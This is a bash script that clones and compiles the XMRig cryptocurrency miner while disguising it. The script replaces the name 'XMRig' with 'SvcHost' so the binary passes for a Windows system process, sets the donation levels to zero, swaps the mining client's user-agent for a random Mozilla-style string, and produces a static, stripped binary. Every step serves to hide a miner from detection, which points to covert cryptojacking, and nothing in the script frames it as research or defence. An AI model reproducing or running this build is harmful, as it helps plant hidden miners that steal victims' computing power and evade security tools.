#!/bin/bash
set -euo pipefail

XMRIG_DIR="${XMRIG_DIR:-xmrig}"
NPROC=$(nproc 2>/dev/null || echo 4)

echo "[*] Cloning XMRig repository..."
if [ ! -d "$XMRIG_DIR" ]; then
    git clone --depth 1 https://github.com/xmrig/xmrig.git "$XMRIG_DIR"
fi

cd "$XMRIG_DIR"

echo "[+] Stripping identifiable strings..."
# Strip all identifiable strings
sed -i 's/XMRig/SvcHost/g' src/version.h 2>/dev/null || true
sed -i 's/xmrig\.com/localhost/g' src/donate.h 2>/dev/null || true
sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/' src/donate.h 2>/dev/null || true
sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/' src/donate.h 2>/dev/null || true

# Randomize the internal user-agent
UA=$(head -c 16 /dev/urandom | xxd -p 2>/dev/null || echo "random_ua")
sed -i "s/\"XMRig\/[^\"]*\"/\"Mozilla\/$UA\"/" src/base/net/stratum/Client.cpp 2>/dev/null || true

echo "[+] Compiling XMRig (static, stripped)..."
mkdir -p build
cd build
cmake .. -DWITH_TLS=OFF -DWITH_HTTPD=OFF \
         -DCMAKE_BUILD_TYPE=Release \
         -DCMAKE_C_FLAGS="-O2 -ffunction-sections -fdata-sections" \
         -DCMAKE_CXX_FLAGS="-O2 -ffunction-sections -fdata-sections" \
         -DCMAKE_EXE_LINKER_FLAGS="-static -Wl,--gc-sections"
make -j"$NPROC"

if [ -f xmrig ]; then
    strip --strip-all xmrig
    echo "[+] Build successful!"
    sha256sum xmrig
    ls -la xmrig
else
    echo "[-] Build failed - xmrig binary not found"
    exit 1
fi
